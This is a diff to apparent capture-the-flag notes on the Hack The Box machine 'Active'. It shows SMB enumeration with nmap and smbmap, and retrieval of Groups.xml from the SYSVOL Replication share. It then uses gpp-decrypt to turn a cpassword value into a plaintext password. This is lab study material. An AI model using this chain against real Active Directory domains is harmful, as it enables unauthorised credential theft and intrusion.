@@ -5,6 +5,7 @@ dnsrecon -d 10.129.151.62 -r 10.0.0.0/8
 ```
 
 ### Nmap
+found the domain name `active.htb` and add it to `/etc/hosts`
 ```
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 
@@ -13,12 +14,25 @@ nmap --script smb-enum-services -d -p 445 active.htb
 ```
 
 ### SMB
-```
+```bash
+smbmap -H active.htb
 smbmap -R Replication -H active.htb --depth 10
 smbmap -R Replication -H active.htb -A Groups.xml -q --depth 10
 ```
+or just download it all with `smbclient` recurse download. Mentioned in Wiki.
 
-### Decrypt Group Policy Preferences (GPP)
+### Group Policy Preferences (GPP) Passsowrds
+When a new GPP is created, an `.xml` file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include thosed used to:
+
+* Map drives (drives.xml)
+* Create local users
+* Create printer config files (printers.xml)
+* Creating scheduled tasks (scheduledtasks.xml)
+* Changing local admin passwords
+
+The `cpassword` attribute value is AES-256 bit encrypted and Microsoft published the AES private key.
+
+### Decrypt Group Policy Preferences (GPP) from `Groups.xml`
 ```
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 GPPstillStandingStrong2k18
